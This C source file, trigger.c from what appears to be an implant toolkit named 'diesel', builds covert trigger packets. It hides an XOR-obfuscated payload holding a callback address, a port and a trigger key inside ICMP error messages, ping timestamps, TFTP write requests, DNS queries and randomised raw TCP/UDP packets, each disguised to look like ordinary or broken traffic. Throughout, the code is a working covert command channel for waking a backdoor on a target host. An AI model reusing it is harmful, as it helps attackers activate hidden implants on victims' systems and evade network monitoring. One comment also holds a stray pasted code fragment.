/*!
 * trigger.c
 *
 * @version 0.1 (October 1, 2007)
 *
 * Implementation for the trigger components of diesel.
 * Uses the payload of the trigger, an 8byte
 * struct. Methods for encoding and decoding
 * the struct on the wire and creating the various
 * trigger packets are defined here.
 *
 * @author Matt Bravo
 *
 */
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <stdio.h>
#include <errno.h>

#include <unistd.h>
#include <sys/time.h>

#include "trigger_protocols.h"
#include "trigger_network.h"
#include "trigger_utils.h"
#include "debug.h"

#define ERROR_DATA_SZ 8		// MUST be an even number
#define SPOOF_MTU 1488		// a lower MTU recommended for ATM

/* internal static functions */
static void obfuscate_payload (Payload * p, uint8_t * ret_buf);

//==============================================================================================

/*!
 * trigger_icmp_error
 *
 * @param p
 * @param ti
 * @return SUCCESS or FAILURE
 *
 * Create and send an icmp error packet (with some special sauce)
 * Hide 12 bytes for the trigger in:
 * 	(2) ID of the IP error header
 * 	(4) dest IP of error header
 * 	(6) Src port and seqence number of TCP error header
 * We place a portion of a TCP packect of supposed size 1498
 * in the error payload of the packet (this is within the RFC rules).
 * We use only the first 8 bytes of the TCP header.
 */

int
trigger_icmp_error (Payload * p, trigger_info * ti)
{
	uint8_t code;
	//assume payload is an even number of bytes
	uint8_t obf_payload_buf[sizeof (Payload)];

	/* onwire headers */
	ip_hdr ip_header;
	icmp_hdr icmp_header;

	/* error headers (data sections) */
	ip_hdr error_ip_header;
	uint16_t tLen, MTU = SPOOF_MTU;

	// we use std 20 ip_hdr bytes + 8  bytes for ICMP header +
	//            20 error ip_hdr bytes + 8  bytes error data (TCP like)
	size_t packet_size = 2 * sizeof (ip_hdr) + sizeof (icmp_hdr) + ERROR_DATA_SZ;

	// all header will eventually be copied into this buffer
	uint8_t packet[packet_size];

	// pointers to the starting address of certain portions of the packet
	uint8_t *icmp_start;
	uint8_t *error_ip_start;
	uint8_t *error_data_start;

	// parameter error checks
	if (p == NULL || ti == NULL) {
		return FAILURE;
	}
	code = ti->icmp_error_code;

	// pointers into the packet where the various headers start
	icmp_start = packet + sizeof (ip_hdr);
	error_ip_start = packet + sizeof (ip_hdr) + sizeof (icmp_hdr);
	error_data_start = packet + 2 * sizeof (ip_hdr) + sizeof (icmp_hdr);

	obfuscate_payload (p, obf_payload_buf);

  /*****----Begin IP Header----*****/

	//now add in trigger dst, the target ip
	ip_header.dest = ti->target_addr;
	ip_header.src = INADDR_ANY;				// system will set to true IP
	ip_header.ver_len = 0x4;				/* 4bit version */
	ip_header.ver_len = ip_header.ver_len << 4;		/* header length 20bytes */
	ip_header.ver_len = ip_header.ver_len | 0x05;		/* OR in the header length */
	ip_header.tos = 0x00;
	ip_header.tLen = htons ((uint16_t) packet_size);	// generic length of 84, this will be changed for errors
	ip_header.id = randShort ();
	ip_header.f_offset = 0x0000;				// go ahead fragment the packet, who cares?
	ip_header.ttl = 0xff;					// ttl 255
	ip_header.proto = 0x01;					// ICMP
	ip_header.chksum = 0x0000;				// set at later time

  /*****----End IP Header----*****/

	memcpy (packet, &ip_header, sizeof (ip_hdr));

  /*****----Begin ICMP Header----*****/
	icmp_header.type = 0x3;
	icmp_header.code = code;
	icmp_header.id = 0x0000;				// id should be 0 on error pkts

	// if this is a don't fragment packet, the 'MTU' needs to be set
	if (code == 4)
		icmp_header.seq = htons (MTU);
	else
		icmp_header.seq = 0x0000;

	icmp_header.chksum = 0x0000;

  /*****----End ICMP Header----*****/

	memcpy (icmp_start, &icmp_header, sizeof (icmp_hdr));

  /*****----Begin ERR IP Header----*****/
	error_ip_header.ver_len = 0x4;					/* 4bit version */
	error_ip_header.ver_len = error_ip_header.ver_len << 4;		/* header length 20bytes */
	error_ip_header.ver_len = error_ip_header.ver_len | 0x05;	/* OR in the header length */
	error_ip_header.tos = 0x00;
	tLen = 0x05DA;
	error_ip_header.tLen = htons (tLen);

	((uint8_t *) & error_ip_header.id)[0] = obf_payload_buf[0];
	((uint8_t *) & error_ip_header.id)[1] = obf_payload_buf[1];

	// if the error is don't fragment set, then we
	// need to make sure don't fragment is in fact set
	if (code == 4) {
		error_ip_header.f_offset = htons (0x4000);
	}
	else {
		error_ip_header.f_offset = 0x0000;
	}

	error_ip_header.ttl = randChar ();
	error_ip_header.proto = 0x06;	// TCP

	// we can't calc a chksum since we only return
	// a 'partial' error pkt
	error_ip_header.chksum = randShort ();
	error_ip_header.src = ti->target_addr;

	((uint8_t *) & error_ip_header.dest)[0] = obf_payload_buf[2];
	((uint8_t *) & error_ip_header.dest)[1] = obf_payload_buf[3];
	((uint8_t *) & error_ip_header.dest)[2] = obf_payload_buf[4];
	((uint8_t *) & error_ip_header.dest)[3] = obf_payload_buf[5];

  /*****----End ERR IP Header----*****/

	memcpy (error_ip_start, &error_ip_header, sizeof (ip_hdr));

	// set the values of the supposed TCP partial header
	error_data_start[0] = obf_payload_buf[6];
	error_data_start[1] = obf_payload_buf[7];

	// port 80, so it looks like a broken web request
	error_data_start[2] = 0;
	error_data_start[3] = 0x50;	//0x50 = dec. 80

	error_data_start[4] = obf_payload_buf[8];
	error_data_start[5] = obf_payload_buf[9];
	error_data_start[6] = obf_payload_buf[10];
	error_data_start[7] = obf_payload_buf[11];

	icmp_header.chksum = cksum ((uint16_t *) icmp_start,
				    (ERROR_DATA_SZ + sizeof (icmp_hdr) +
				     sizeof (ip_hdr)) / 2);

	memcpy (icmp_start, &icmp_header, sizeof (icmp_hdr));

	send_RAW_from_IPPROTO (ip_header.dest, packet, packet_size);

	return SUCCESS;

}


/*!
 *
 * @param p	- payload
 * @param return_buffer
 *
 * Pass a payload, get back an obfuscated payload ready for the wire!
 * All values are placed in return_buffer.
 * The payload has already been initialized with random data, so use the first
 * byte as the seed by which the rest are XORd.
 *
 * NOTE: obfuscate_payload is only needed for triggers such as icmp_ping. Raw
 * triggers are already obfuscated.
 *
 */
static void
obfuscate_payload (Payload *p, uint8_t *return_buffer)
{
	int i;
	uint8_t *package;

	package = (uint8_t *)p;
	if (p->seed == 0)		// Make sure seed is not zero, otherwise payload doesn't get obfuscated.
		p->seed = 0xFF;

	return_buffer[0] = p->seed;
	for (i = 1; i < (int) sizeof (Payload); i++) {
		return_buffer[i] = package[i] ^ p->seed;	//Obfuscate payload by XORing it with seed byte
	}
}


/*!
 * trigger_icmp_ping
 * @param p	- payload
 * @param ti	- trigger
 * @return
 * 	\retval         SUCCESS (0) success
 * 	\retval         FAILURE (-1) failure
 * 	\retval		EXIT if unable to allocate memory
 *
 * Splits the payload up into 6 packets before sending.
 */
int
trigger_icmp_ping (Payload * p, trigger_info * ti)
{

	int type;
	uint32_t data_sz = 56;
	uint8_t obf_payload_buf[sizeof (Payload)];

	uint16_t seq = 0, icmpID;
	uint32_t numPings;
	ip_hdr ih;
	icmp_hdr ich;
	uint8_t *packet, *data, *icmp_start;
	uint8_t icmpT;
	size_t packet_size;

	// parameter error checks
	if (p == NULL || ti == NULL) {
		return FAILURE;
	}

	numPings = sizeof(Payload) / 2;		// Number of pings required is dependent upon the payload size
	DLX (4, printf ("Number of pings required: %d\n", numPings));
	type = ti->trigger_type;

	DLX(3,
		{
			size_t i;

			printf ("Pre-obfuscation");
			printf ("Seed: %2.2X", p->seed);
			printf ("  Payload: ");
			for (i = 0; i < sizeof(Payload); i++) {
				printf ("%2.2X ", ((uint8_t *) p)[i]);
			}
			printf ("  CRC: 0x%4.4X\n", p->crc);
			printf ("\n");
		}
	);

	obfuscate_payload (p, obf_payload_buf);

	DLX(3,
		{
			unsigned int i;

			printf ("Post-obfuscation\n");
			printf ("RAW BYTES: ");
			for (i = 0; i < sizeof (obf_payload_buf); i++) {
				printf ("%2.2X ", ((uint8_t *) obf_payload_buf)[i]);
			}
			printf ("\n");
		}
	);

	// data_sz must be an even number, verify this or pad if necessary
	if (data_sz % 2 != 0)
		data_sz++;

	if (type == T_PING_REQUEST) {
		icmpT = 8;
	}
	else {
		icmpT = 0;
	}
	packet_size = sizeof (ip_hdr) + sizeof (icmp_hdr) + data_sz;
	icmpID = randShort ();	// same random ID for all 6 packets

	// Send the payload via pings
	// The trigger payload is 12 bytes total, including the final two-byte CRC.
	// The current algorithm sends the first two bytes in the initial ping and
	// subsequent bytes in each of the following consecutive pings, hiding the payload
	// in the milliseconds field of the time stamp.
	for (seq = 1; seq <= numPings; seq++) {

		if ((packet = (uint8_t *) calloc (packet_size, 1)) == NULL) {
			//calloc() memory allocation failed
			perror (" calloc");
			exit (-1);
		}

		icmp_start = packet + sizeof (ip_hdr);
		data = packet + sizeof (ip_hdr) + sizeof (icmp_hdr);

		/* fill in generic information information in the header */
		ping_generic (&ih, &ich, data, data_sz);

    /*****----Begin Data Section----*****/
		// Hide payload in bytes 4 and 5 (millisecond field) of the time stamp.
		memcpy (((uint8_t *) data) + 4, obf_payload_buf + ((seq - 1) * 2), 2);
    /*****----End Data Section----*****/

    /*****----Begin IP Header----*****/
		//now add in trigger dst, the target ip
		ih.dest = ti->target_addr;
		ih.src = INADDR_ANY;
		memcpy (packet, &ih, sizeof (ip_hdr));
    /*****----End IP Header----*****/

    /*****----Begin ICMP Header----*****/
		ich.type = icmpT;
		ich.id = icmpID;
		ich.seq = htons (seq);
		memcpy (icmp_start, &ich, sizeof (icmp_hdr));
		ich.chksum = cksum ((uint16_t *) icmp_start, (packet_size - sizeof (ip_hdr)) / 2);	// pkt is in net order, no need to convert
		memcpy (icmp_start, &ich, sizeof (icmp_hdr));
    /*****----End ICMP Header----*****/

		send_RAW_from_IPPROTO (ih.dest, packet, packet_size);

		// free the packet
		free (packet);
		packet = NULL;
		sleep (1);	// 1 sec delay between pings
	}

	return SUCCESS;
}

int
byte_fill (uint8_t * ptr, size_t sz)
{
	uint8_t v = 0;
	uint32_t index;

	for (index = 0; index < sz; index++) {
		ptr[index] = v++;
	}
	return 0;
}


/*!
 *
 * @param iph
 *
 *
 *
 */

void
icmp_generic (ip_hdr * iph)
{
	if (iph == NULL)
		return;

	/* set the values in the header */
	iph->ver_len = 0x4;			/* 4bit version */
	iph->ver_len = iph->ver_len << 4;	/* header length 20bytes */
	iph->ver_len = iph->ver_len | 0x05;	/* OR in the header length */
	iph->tos = 0x00;
	iph->tLen = 0x3e00;			// generic length of 84, this will be changed for errors
	iph->id = 0x0000;			// should be zero when df set
	iph->f_offset = 0x0040;			//don't frag set
	iph->ttl = 0x40;			// ttl 64
	iph->proto = 0x01;			// ICMP
	iph->chksum = 0x0000;

	// leave src and dest blank
	iph->dest = INADDR_ANY;
	iph->src = INADDR_ANY;

}

/*!			//cout << "\n\n\n Calling trigger_raw_tcp...\n" << endl;
			rv = trigger_raw( &p, &ti );
			break;
 *
 * ping_generic
 *
 * @param ih - Pointer to ip header
 * @param ich - Pointer to icmp header
 * @param data
 * @param fillSZ
 * \todo Not sure if this function's description is correct.
 * Create a icmp ping request with the spoofed addr
 * and the payload in the data section. Send via
 * RAW socket.
 *
 * Set values of the header to some conventional values, use a random number for ID.
 */

void
ping_generic (ip_hdr * ih, icmp_hdr * ich, uint8_t * data, uint32_t fillSZ)
{
	struct timeval tod;

  /*****----Begin IP Header----*****/
	icmp_generic (ih);

	ih->tLen = fillSZ + sizeof (ip_hdr) + sizeof (icmp_hdr);	// data plus headers
  /*****----End IP Header----*****/

  /*****----Begin ICMP Header----*****/
	ich->type = 0x8;	// will be 0 or 8, assume request
	ich->code = 0x0;	// ALWAYS zero in ping
	ich->chksum = 0x0000;
	ich->id = randShort ();
	ich->seq = 0x0;
  /*****----End ICMP Header----*****/


  /*****----Begin ICMP Data----*****/
	// add in the sequential data and the timestamp
	byte_fill (data, fillSZ);
	gettimeofday (&tod, NULL);
	memcpy (data, &tod, sizeof (struct timeval));
  /*****----End ICMP Data----*****/
}


int
trigger_tftp_wrq (Payload * p, trigger_info * ti)
{
	int encoded_size;

	in_addr_t s_addr;
	in_addr_t d_addr;
	uint16_t s_port;
	uint16_t d_port;

	char *netascii = "netascii";

	uint8_t obf_payload_buf[sizeof (Payload)];
	uint8_t encoded_payload_buf[2 * sizeof (Payload)];
	uint8_t *tftp_data;
	size_t data_size;


	DLX(3,
		{
			size_t i;

			printf ("Pre-obfuscation");
			printf ("Seed: %2.2X", p->seed);
			printf ("  Payload: ");
			for (i = 0; i < sizeof(Payload); i++) {
				printf ("%2.2X ", ((uint8_t *) p)[i]);
			}
			printf ("  CRC: 0x%4.4X\n", p->crc);
			printf ("\n");
		}
	);

	// parameter error checks
	if (p == NULL || ti == NULL) {
		return FAILURE;
	}

	obfuscate_payload (p, obf_payload_buf);

	DLX(3,
		{
			size_t i;

			printf ("Post-obfuscation\n");
			printf ("RAW BYTES: ");
			for (i = 0; i < sizeof(obf_payload_buf); i++) {
				printf ("%2.2X ", ((uint8_t *) obf_payload_buf)[i]);
			}
			printf ("\n");
		}
	);

	// base64 encode the payload
	cu_b64_encode_message (obf_payload_buf,
			       encoded_payload_buf,
			       sizeof (Payload), &encoded_size);

	encoded_payload_buf[encoded_size] = '\0';
	encoded_size++;		//account for the NULL

	DLX(5, printf("encoded payload: %s\n", encoded_payload_buf));

	//tftp opcode (2 bytes) + filename + netascii + NULL
	data_size = 2 + encoded_size + strlen (netascii) + 1;

	//if ( ( tftp_data = (uint8_t*)calloc(data_size, 1) ) == NULL )
	if ((tftp_data = (uint8_t *) calloc (data_size, 2)) == NULL) {
		// calloc() memory allocation failed
		perror (" calloc");
		exit (-1);
	}

	//now add in trigger dst, the target ip
	d_addr = ti->target_addr;
	s_addr = INADDR_ANY;	// system will set to true IP
	s_port = randShort ();
	d_port = htons (69);

  /*****----Begin TFTP----*****/
	// opcode of 2, WRQ
	tftp_data[0] = 0;
	tftp_data[1] = 2;

	// base 64 string
	memcpy (tftp_data + 2, encoded_payload_buf, encoded_size);

	// netascii string
	memcpy (tftp_data + 2 + encoded_size,
		netascii, strlen (netascii) + 2);

  /*****----End TFTP----*****/

	send_UDP_data (s_addr, d_addr, s_port, d_port, tftp_data, data_size);

	// free the packet
	free (tftp_data);
	tftp_data = NULL;

	return SUCCESS;
}

int
trigger_dns_query (Payload * p, trigger_info * ti)
{
	int encoded_size;

	in_addr_t s_addr;
	in_addr_t d_addr;
	uint16_t s_port;
	uint16_t d_port;

	char google[6];
	char com[3];

	uint8_t obf_payload_buf[sizeof (Payload)];
	uint8_t encoded_payload_buf[2 * sizeof (Payload)];

	uint8_t *dns_data;

	size_t data_size;

	int index = 0;

	// parameter error checks
	if (p == NULL || ti == NULL) {
		return FAILURE;
	}

	google[0] = 'g';
	google[1] = 'o';
	google[2] = 'o';
	google[3] = 'g';
	google[4] = 'l';
	google[5] = 'e';

	com[0] = 'c';
	com[1] = 'o';
	com[2] = 'm';

	obfuscate_payload (p, obf_payload_buf);

	// base64 encode the payload
	cu_b64_encode_message (obf_payload_buf,
			       encoded_payload_buf,
			       sizeof (Payload), &encoded_size);

	// TODO: **START CHANGES:  added by Jeremy because TFTP code as these two lines
	encoded_payload_buf[encoded_size] = '\0';

	encoded_size++;		//account for the NULL
	// TODO: ** END CHANGES

	DLX(5, printf("encoded payload: %s\n", encoded_payload_buf));

	// dns header (12 bytes) + 3 bytes for name sizes  + encoded_size +
	// 6 for google + 3 for com + 1 for NULL + 4 for type and class
	data_size = 12 + 3 + encoded_size + 6 + 3 + 1 + 4;

	if ((dns_data = (uint8_t *) calloc (data_size, 1)) == NULL) {
		// calloc() memory allocation failed
		perror (" calloc()");
		exit (-1);
	}

	//now add in trigger dst, the target ip
	d_addr = ti->target_addr;
	s_addr = INADDR_ANY;	// system will set to true IP
	s_port = randShort ();
	d_port = htons (53);

  /*****----Begin DNS----*****/
	// transaction ID
	dns_data[index++] = randChar ();
	dns_data[index++] = randChar ();

	//flags
	dns_data[index++] = 1;
	dns_data[index++] = 0;

	// num queries
	dns_data[index++] = 0;
	dns_data[index++] = 1;

	// num answers
	dns_data[index++] = 0;
	dns_data[index++] = 0;

	// num authority
	dns_data[index++] = 0;
	dns_data[index++] = 0;

	// num additional
	dns_data[index++] = 0;
	dns_data[index++] = 0;

	dns_data[index++] = encoded_size;

	// base 64 string
	memcpy (dns_data + index, encoded_payload_buf, encoded_size);
	index += encoded_size;
	dns_data[index++] = 6;

	// google string
	memcpy (dns_data + index, google, 6);
	index += 6;
	dns_data[index++] = 3;

	// com string
	memcpy (dns_data + index, com, 3);
	index += 3;

	dns_data[index++] = 0;

	// dns type
	dns_data[index++] = 0;
	dns_data[index++] = 1;

	// dns class
	dns_data[index++] = 0;
	dns_data[index++] = 1;

  /*****----End DNS----*****/

	send_UDP_data (s_addr, d_addr, s_port, d_port, dns_data, data_size);

	// free the packet
	free (dns_data);
	dns_data = NULL;

	return SUCCESS;

}

int
trigger_icmp_dest_unreachable (Payload * p, trigger_info * ti)
{

	uint8_t code;
	//assume payload is an even number of bytes
	uint8_t obf_payload_buf[sizeof (Payload)];

	/* onwire headers */
	ip_hdr ip_header;
	icmp_hdr icmp_header;

	/* error headers (data sections) */
	ip_hdr error_ip_header;
	uint16_t tLen, MTU = SPOOF_MTU;

	// we use std 20 ip_hdr bytes + 8  bytes for ICMP header +
	//            20 error ip_hdr bytes + 8  bytes error data (TCP like)
	size_t packet_size = 2 * sizeof (ip_hdr) + sizeof (icmp_hdr) + ERROR_DATA_SZ;

	// all header will eventually be copied into this buffer
	uint8_t packet[packet_size];

	// pointers to the starting address of certain portions of the packet
	uint8_t *icmp_start;
	uint8_t *error_ip_start;
	uint8_t *error_data_start;

	// parameter error checks
	if (p == NULL || ti == NULL) {
		return FAILURE;
	}

	code = ti->icmp_error_code;

	// pointers into the packet where the various headers start
	icmp_start = packet + sizeof (ip_hdr);
	error_ip_start = packet + sizeof (ip_hdr) + sizeof (icmp_hdr);
	error_data_start = packet + 2 * sizeof (ip_hdr) + sizeof (icmp_hdr);
	// ------
	obfuscate_payload (p, obf_payload_buf);

  /*****----Begin IP Header----*****/

	//now add in trigger dst, the target ip
	ip_header.dest = ti->target_addr;
	ip_header.src = INADDR_ANY;			// system will set to true IP
	ip_header.ver_len = 0x4;			/* 4bit version */
	ip_header.ver_len = ip_header.ver_len << 4;	/* header length 20bytes */
	ip_header.ver_len = ip_header.ver_len | 0x05;	/* OR in the header length */
	ip_header.tos = 0x00;
	ip_header.tLen = htons ((uint16_t) packet_size);	// generic length of 84, this will be changed for errors
	ip_header.id = randShort ();
	ip_header.f_offset = 0x0000;	// go ahead fragment the packet, who cares?
	ip_header.ttl = 0xff;	// ttl 255
	ip_header.proto = 0x01;	// ICMP
	ip_header.chksum = 0x0000;	// set at later time

  /*****----End IP Header----*****/

	memcpy (packet, &ip_header, sizeof (ip_hdr));

  /*****----Begin ICMP Header----*****/
	icmp_header.type = 0x3;
	icmp_header.code = code;
	icmp_header.id = 0x0000;	// id should be 0 on error pkts

	// if this is a dont fragment packet, the 'MTU' needs to be set
	if (code == 4)
		icmp_header.seq = htons (MTU);
	else
		icmp_header.seq = 0x0000;

	icmp_header.chksum = 0x0000;

  /*****----End ICMP Header----*****/

	memcpy (icmp_start, &icmp_header, sizeof (icmp_hdr));

  /*****----Begin ERR IP Header----*****/
	error_ip_header.ver_len = 0x4;	/* 4bit version */
	error_ip_header.ver_len = error_ip_header.ver_len << 4;	/* header length 20bytes */
	error_ip_header.ver_len = error_ip_header.ver_len | 0x05;	/* OR in the header length */
	error_ip_header.tos = 0x00;
	tLen = 0x05DA;
	error_ip_header.tLen = htons (tLen);

	((uint8_t *) & error_ip_header.id)[0] = obf_payload_buf[0];
	((uint8_t *) & error_ip_header.id)[1] = obf_payload_buf[1];

	// if the error is don't fragment set, then we
	// need to make sure don't fragment is in fact set
	if (code == 4) {
		error_ip_header.f_offset = htons (0x4000);
	}
	else {
		error_ip_header.f_offset = 0x0000;
	}

	error_ip_header.ttl = randChar ();
	error_ip_header.proto = 0x06;	// TCP

	// we can't calc a chksum since we only return
	// a 'partial' error pkt
	error_ip_header.chksum = randShort ();
	error_ip_header.src = ti->target_addr;

	((uint8_t *) & error_ip_header.dest)[0] = obf_payload_buf[2];
	((uint8_t *) & error_ip_header.dest)[1] = obf_payload_buf[3];
	((uint8_t *) & error_ip_header.dest)[2] = obf_payload_buf[4];
	((uint8_t *) & error_ip_header.dest)[3] = obf_payload_buf[5];

  /*****----End ERR IP Header----*****/

	memcpy (error_ip_start, &error_ip_header, sizeof (ip_hdr));

	// set the values of the supposed TCP partial header
	error_data_start[0] = obf_payload_buf[6];
	error_data_start[1] = obf_payload_buf[7];

	// port 80, so it looks like a broken web request
	error_data_start[2] = 0;
	error_data_start[3] = 0x50;	//0x50 = dec. 80

	error_data_start[4] = obf_payload_buf[8];
	error_data_start[5] = obf_payload_buf[9];
	error_data_start[6] = obf_payload_buf[10];
	error_data_start[7] = obf_payload_buf[11];

	icmp_header.chksum = cksum ((uint16_t *) icmp_start,
				    (ERROR_DATA_SZ + sizeof (icmp_hdr) +
				     sizeof (ip_hdr)) / 2);

	memcpy (icmp_start, &icmp_header, sizeof (icmp_hdr));

	send_RAW_from_IPPROTO (ip_header.dest, packet, packet_size);

	return SUCCESS;
}

/*!
 * trigger_raw
 * @param p	- The location of the payload to be sent.
 * @param ti	- Trigger info
 * @return SUCCESS or FAILURE
 */
unsigned int
trigger_raw (Payload *p, trigger_info *ti)
{
	uint16_t	crc = 0;
	uint16_t	crc_net;
	void		*fieldPtr;		// Packet field pointer
	uint8_t		*payloadKeyIndex;
	uint8_t		*packet;
	size_t		packet_size;

	in_addr_t	s_addr;
	in_addr_t	d_addr;
	uint16_t	s_port;
	uint16_t	d_port;

	uint16_t	validator;		// An integer divisible by 127
	uint16_t	validator_net;
	int i;					// Loop counter
	int		rv;

	DLX (4, printf ("raw_tcp\n"));

	if ((packet = (uint8_t *) calloc (MAX_PACKET_SIZE, 1)) == NULL) {
		perror (" calloc()");	// calloc() memory allocation failed
		exit (-1);
	}

	//now add in trigger dst, the target ip
	d_addr = ti->target_addr;
	s_addr = INADDR_ANY;	// system will set to true IP
	s_port = randShort();
	d_port = htons (ti->trigger_port);
	DLX(2, printf ("Sending TCP trigger to port %d\n", ti->trigger_port));

	// Fill maximum packet size with random data
	for (i = 0; i < MAX_PACKET_SIZE; i++) {
		packet[i] = randChar();
	}

	// Compute the checksum of the CRC Data Field that follows the START_PAD.
	crc = tiny_crc16 ((unsigned char *) ((char *) packet + START_PAD), CRC_DATA_LENGTH);
	crc_net = htons(crc);

	// Store the computed CRC at a location START_PAD + CRC_DATA_LENGTH + CRC % RANDOM_PAD1 into the packet.
	fieldPtr = packet + START_PAD + CRC_DATA_LENGTH + (crc % RANDOM_PAD1);	// Set field pointer
	DLX(4, printf (" %s, %d:\tCRC offset: 0x%x, crc: 0x%0x, crc_net: 0x%0x\n", __FILE__, __LINE__, (unsigned int)((uint8_t *)fieldPtr - packet), crc, crc_net));
	memcpy (fieldPtr, &crc_net, sizeof (crc_net));
	fieldPtr += sizeof(crc_net);				// Jump field pointer to next field

	// Create a validator integer divisible by 127 and store it at the field pointer location.
	validator = (uint8_t)randChar() * 127;
	validator_net = htons(validator);
	DLX(4, printf ("\tvalidator offset: 0x%x, validator: 0x%x, validator_net: 0x%x\n", (unsigned int)((uint8_t *)fieldPtr - packet), (unsigned int)validator, validator_net));
	memcpy(fieldPtr, &validator_net, sizeof(validator_net));

	// Encode the payload by XORing it with random data starting at a location within the random data used to generate the CRC.
	fieldPtr += sizeof(validator_net) + PAD1;			// Update the field pointer to the payload location.
	payloadKeyIndex = (uint8_t *)(packet + START_PAD + (crc % (CRC_DATA_LENGTH - sizeof(Payload))));	// Compute the start of the payload key
	DLX(4, printf ("\tEncoded payload offset: 0x%0x, payload key offset: 0x%0x\tPayload follows\n", (unsigned int)((uint8_t *)fieldPtr - packet), (unsigned int)(payloadKeyIndex-packet)));

	for (i = 0; i < (int)sizeof(Payload); i++) {
		uint8_t trigger;
		trigger = payloadKeyIndex[i] ^ ((uint8_t *)p)[i];			// XOR the payload with the key
		D (printf ("\tByte[%2.2d]: payload =  0x%2.2x, payloadKey = 0x%2.2x, encoded payload = 0x%2.2x\n", i, ((uint8_t *)p)[i], payloadKeyIndex[i], trigger); )
		memcpy(fieldPtr + i, &trigger, sizeof(uint8_t));
	}

	fieldPtr += sizeof(Payload) + PAD2;
	DLX(4, printf ("\n\tPacket Length: %d\n",(unsigned int)((uint8_t *)fieldPtr - packet + (crc % RANDOM_PAD2))));
	packet_size = (unsigned int)((uint8_t *)fieldPtr - packet + (crc % RANDOM_PAD2));	// Total length of the packet, including a randomized padding length.

	switch (ti->trigger_type) {

	case T_RAW_TCP:
		rv = send_TCP_data (s_addr, d_addr, s_port, d_port, packet, packet_size);
		break;

	case T_RAW_UDP:
		rv = send_UDP_data (s_addr, d_addr, s_port, d_port, packet, packet_size);
		break;

	default:
		rv = -1;
		break;
	}

	// free the packet
	if (packet != NULL)
		free (packet);
	packet = NULL;

	if (rv == -1)
		return FAILURE;

	return SUCCESS;
}

/*! \brief Move trigger into payload.
 *
 * @param p payload
 * @param ti trigger
 * @return SUCCESS or FAILURE.
 */
int
trigger_info_to_payload (Payload * p, trigger_info * ti)
{
	uint16_t crc;

	if (p == NULL || ti == NULL) {
		return FAILURE;
	}

	p->callback_addr = ti->callback_addr;	// Previous call to inet_pton() already converted address to network byte order.
	p->callback_port = htons(ti->callback_port);
	memcpy (&(p->triggerKey), &(ti->triggerKey), ID_KEY_HASH_SIZE);

	p->crc = 0;
	crc = tiny_crc16 ((const uint8_t *) p, sizeof (Payload));
	crc = htons (crc);
	p->crc = crc;

	return SUCCESS;
}
